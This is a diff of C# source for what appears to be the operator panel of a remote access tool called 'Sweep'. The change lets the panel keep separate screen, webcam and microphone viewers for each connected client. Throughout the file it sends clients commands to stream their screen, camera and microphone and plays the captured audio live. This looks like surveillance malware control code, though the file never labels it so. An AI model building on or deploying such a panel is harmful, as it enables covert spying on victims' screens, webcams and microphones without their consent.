@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
 using System.Linq;
@@ -19,15 +20,16 @@ namespace Sweep.Services
         private readonly LazyServerHost _server;
         private readonly ObjectListView _listView;
         private readonly ObjectListView _logsview;
-        private ScreenViewer viewer;
-        private WebcamViewer webcamViewer;
-        private string previousid = string.Empty;
         private Sweep.Forms.Sweep _sweepform;
-        private MicViewer micViewer;
 
-        // Audio playback components
-        private WaveOutEvent waveOut;
-        private BufferedWaveProvider bufferedProvider;
+        // One viewer per client
+        private readonly Dictionary<string, ScreenViewer> screenViewers = new();
+        private readonly Dictionary<string, WebcamViewer> webcamViewers = new();
+        private readonly Dictionary<string, MicViewer> micViewers = new();
+
+        // Audio playback
+        private readonly Dictionary<string, WaveOutEvent> waveOuts = new();
+        private readonly Dictionary<string, BufferedWaveProvider> bufferedProviders = new();
 
         public MessageHandler(LazyServerHost server, ObjectListView listView, int port, ObjectListView logsview, Forms.Sweep th)
         {
@@ -100,148 +102,173 @@ namespace Sweep.Services
             };
 
             if (_listView.InvokeRequired)
-            {
                 _logsview.Invoke(new Action(() => _logsview.AddObject(log)));
-            }
             else
-            {
                 _logsview.AddObject(log);
-            }
-        }
-
-        private async Task HandleWebcamAsync(JObject meta, string clientId, byte[] packet)
-        {
-            if (webcamViewer == null || webcamViewer.IsDisposed || clientId != previousid)
-            {
-                var ctrl = _listView;
-
-                void ShowViewer()
-                {
-                    webcamViewer = new WebcamViewer();
-                    webcamViewer.Show();
-
-                    webcamViewer.QualityChanged += async (string quality) =>
-                    {
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = "camloop",
-                            ["quality"] = quality
-                        }.ToString());
-                    };
-
-                    webcamViewer.Closing += async () =>
-                    {
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = "stopcam"
-                        }.ToString());
-                    };
-
-                    webcamViewer.ScreenEvent += async (bool active) =>
-                    {
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = active ? "camloop" : "stopcam"
-                        }.ToString());
-                    };
-
-                    webcamViewer.MonitorChanged += async (int index) =>
-                    {
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = "cam",
-                            ["idx"] = index
-                        }.ToString());
-                    };
-                }
-
-                if (ctrl.InvokeRequired)
-                    ctrl.Invoke((Action)ShowViewer);
-                else
-                    ShowViewer();
-            }
-
-            previousid = clientId;
-            int camCount = (int?)meta["cameras"] ?? 1;
-            webcamViewer.SetMonitors(camCount);
-
-            try
-            {
-                using var ms = new MemoryStream(packet);
-                var frame = Image.FromStream(ms);
-                webcamViewer.SetScreen(frame);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error in HandleWebcamAsync: " + ex);
-            }
         }
 
         private async Task HandleScreenshotAsync(JObject meta, string clientId, byte[] packet)
         {
-            if (viewer == null || viewer.IsDisposed || clientId != previousid)
+            if (!screenViewers.ContainsKey(clientId) || screenViewers[clientId].IsDisposed)
             {
-                var ctrl = _listView;
-
                 void ShowViewer()
                 {
-                    viewer = new ScreenViewer();
-                    viewer.Show();
+                    var viewer = new ScreenViewer();
+                    screenViewers[clientId] = viewer;
+
                     viewer.SetMonitors((int)meta["monitors"]);
 
-                    viewer.QualityChanged += async (string quality) =>
+                    viewer.QualityChanged += async (quality) =>
                     {
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = "ssloop",
-                            ["quality"] = quality
-                        }.ToString());
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "ssloop", ["quality"] = quality }.ToString());
+                    };
+
+                    viewer.ScreenEvent += async (active) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = active ? "ssloop" : "stopss" }.ToString());
+                    };
+
+                    viewer.MonitorChanged += async (index) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "mon", ["idx"] = index }.ToString());
                     };
 
                     viewer.Closing += async () =>
                     {
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = "stopss"
-                        }.ToString());
+                        screenViewers.Remove(clientId);
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "stopss" }.ToString());
                     };
 
-                    viewer.ScreenEvent += async (bool active) =>
-                    {
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = active ? "ssloop" : "stopss"
-                        }.ToString());
-                    };
-
-                    viewer.MonitorChanged += async (int index) =>
-                    {
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = "mon",
-                            ["idx"] = index
-                        }.ToString());
-                    };
+                    viewer.Show();
                 }
 
-                if (ctrl.InvokeRequired)
-                    ctrl.Invoke((Action)ShowViewer);
+                if (_listView.InvokeRequired)
+                    _listView.Invoke((Action)ShowViewer);
                 else
                     ShowViewer();
             }
 
-            previousid = clientId;
+            using var ms = new MemoryStream(packet);
+            var image = Image.FromStream(ms);
+            try { screenViewers[clientId].SetScreen(image); } catch (Exception ex) {
+                AddLogToList(new JObject { 
+                    ["message"] = ex.Message,
+                    ["type"] = "Error"
+                });
+            };
+            
+        }
 
-            try
+        private async Task HandleWebcamAsync(JObject meta, string clientId, byte[] packet)
+        {
+            if (!webcamViewers.ContainsKey(clientId) || webcamViewers[clientId].IsDisposed)
             {
-                using var ms = new MemoryStream(packet);
-                var image = Image.FromStream(ms);
-                viewer.SetScreen(image);
+                void ShowViewer()
+                {
+                    var viewer = new WebcamViewer();
+                    webcamViewers[clientId] = viewer;
+
+                    viewer.SetMonitors((int?)meta["cameras"] ?? 1);
+
+                    viewer.QualityChanged += async (quality) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "camloop", ["quality"] = quality }.ToString());
+                    };
+
+                    viewer.ScreenEvent += async (active) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = active ? "camloop" : "stopcam" }.ToString());
+                    };
+
+                    viewer.MonitorChanged += async (index) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "cam", ["idx"] = index }.ToString());
+                    };
+
+                    viewer.Closing += async () =>
+                    {
+                        webcamViewers.Remove(clientId);
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "stopcam" }.ToString());
+                    };
+
+                    viewer.Show();
+                }
+
+                if (_listView.InvokeRequired)
+                    _listView.Invoke((Action)ShowViewer);
+                else
+                    ShowViewer();
             }
-            catch (Exception ex)
+
+            using var ms = new MemoryStream(packet);
+            var image = Image.FromStream(ms);
+            webcamViewers[clientId].SetScreen(image);
+        }
+
+        private async Task HandleMicAudioAsync(JObject meta, string clientId, byte[] audioBytes)
+        {
+            if (!micViewers.ContainsKey(clientId) || micViewers[clientId].IsDisposed)
             {
-                Console.WriteLine("Error in HandleScreenshotAsync: " + ex);
+                void CreateViewer()
+                {
+                    var viewer = new MicViewer();
+                    micViewers[clientId] = viewer;
+
+                    viewer.SetMonitors((int)meta["microphones"]);
+
+                    viewer.Mic += async (active) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = active ? "micloop" : "stopmic" }.ToString());
+                    };
+
+                    viewer.DeviceChanged += async (index) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "stopmic" }.ToString());
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "mic", ["idx"] = index }.ToString());
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "micloop" }.ToString());
+                    };
+
+                    viewer.MicClosing += async () =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "stopmic" }.ToString());
+                    };
+
+                    viewer.FormClosed += (s, e) =>
+                    {
+                        micViewers.Remove(clientId);
+                        waveOuts.TryGetValue(clientId, out var waveOut);
+                        waveOut?.Stop();
+                        waveOut?.Dispose();
+                        waveOuts.Remove(clientId);
+                        bufferedProviders.Remove(clientId);
+                    };
+
+                    viewer.Show();
+                }
+
+                if (_listView.InvokeRequired)
+                    _listView.Invoke((Action)CreateViewer);
+                else
+                    CreateViewer();
             }
+
+            if (!waveOuts.ContainsKey(clientId))
+            {
+                var waveFormat = new WaveFormat(8000, 1);
+                var provider = new BufferedWaveProvider(waveFormat)
+                {
+                    DiscardOnBufferOverflow = true,
+                    BufferLength = 1024 * 100
+                };
+                var waveOut = new WaveOutEvent();
+                waveOut.Init(provider);
+                waveOut.Play();
+
+                waveOuts[clientId] = waveOut;
+                bufferedProviders[clientId] = provider;
+            }
+
+            bufferedProviders[clientId].AddSamples(audioBytes, 0, audioBytes.Length);
         }
 
         private async Task HandleAliveAsync(JObject meta, string clientId, byte[] packet)
@@ -274,108 +301,48 @@ namespace Sweep.Services
                     _listView.BeginInvoke(new Action(() => _listView.AddObject(client)));
                 else
                     _listView.AddObject(client);
+
+                AddLogToList(new JObject
+                {
+                    ["message"] = $"Client connected {clientId}",
+                    ["type"] = "Info"
+                });
             }
             catch (Exception ex)
             {
                 Console.WriteLine("Error in HandleAliveAsync: " + ex);
+                AddLogToList(new JObject
+                {
+                    ["message"] = ex.Message,
+                    ["type"] = "Error"
+                });
             }
         }
-
-        private async Task HandleMicAudioAsync(JObject meta, string clientId, byte[] audioBytes)
-        {
-            var ctrl = _listView;
-            if (micViewer == null || micViewer.IsDisposed || clientId != previousid)
-            {
-                void CreateForm()
-                {
-                    micViewer = new MicViewer();
-                    micViewer.SetMonitors((int)meta["microphones"]);
-
-                    micViewer.Mic += async (bool y) =>
-                    {
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = y ? "micloop" : "stopmic",
-                        }.ToString());
-                    };
-
-                    micViewer.DeviceChanged += async (int y) =>
-                    {
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = "stopmic",
-                        }.ToString());
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = "mic",
-                            ["idx"] = y
-                        }.ToString());
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = "micloop",
-                        }.ToString());
-                    };
-
-                    micViewer.MicClosing += async () => {
-                        await _server.SendMessageToClient(clientId, new JObject
-                        {
-                            ["command"] = "stopmic",
-                        }.ToString());
-                    };
-
-                    micViewer.Show();
-                }
-
-                if (ctrl.InvokeRequired)
-                    ctrl.Invoke((Action)CreateForm);
-                else
-                    CreateForm();
-            }
-
-            previousid = clientId;
-
-            try
-            {
-                if (waveOut == null || bufferedProvider == null)
-                {
-                    var waveFormat = new WaveFormat(8000, 1); // 8 kHz, mono to match client
-
-                    bufferedProvider = new BufferedWaveProvider(waveFormat)
-                    {
-                        DiscardOnBufferOverflow = true,
-                        BufferLength = 1024 * 100
-                    };
-
-                    waveOut = new WaveOutEvent();
-                    waveOut.Init(bufferedProvider);
-                    waveOut.Play();
-                }
-
-                bufferedProvider.AddSamples(audioBytes, 0, audioBytes.Length);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error playing mic audio: " + ex);
-            }
-        }
-
 
         private void OnClientDisconnected(object sender, string clientId)
         {
             if (_listView.InvokeRequired)
-            {
                 _listView.Invoke(new Action(() => RemoveClientById(clientId)));
-            }
             else
-            {
                 RemoveClientById(clientId);
-            }
 
-            // Clean up audio playback
-            waveOut?.Stop();
-            waveOut?.Dispose();
-            waveOut = null;
-            bufferedProvider = null;
+            screenViewers.TryGetValue(clientId, out var sv);
+            sv?.Invoke(new Action(() => sv.Close()));
+            screenViewers.Remove(clientId);
+
+            webcamViewers.TryGetValue(clientId, out var wv);
+            wv?.Invoke(new Action(() => wv.Close()));
+            webcamViewers.Remove(clientId);
+
+            micViewers.TryGetValue(clientId, out var mv);
+            mv?.Invoke(new Action(() => mv.Close()));
+            micViewers.Remove(clientId);
+
+            waveOuts.TryGetValue(clientId, out var wo);
+            wo?.Stop();
+            wo?.Dispose();
+            waveOuts.Remove(clientId);
+            bufferedProviders.Remove(clientId);
         }
 
         private void RemoveClientById(string clientId)
@@ -389,7 +356,7 @@ namespace Sweep.Services
                     Console.WriteLine($"Client disconnected and removed: {clientId}");
                 }
             }
-            catch {};
+            catch { }
         }
     }
 }
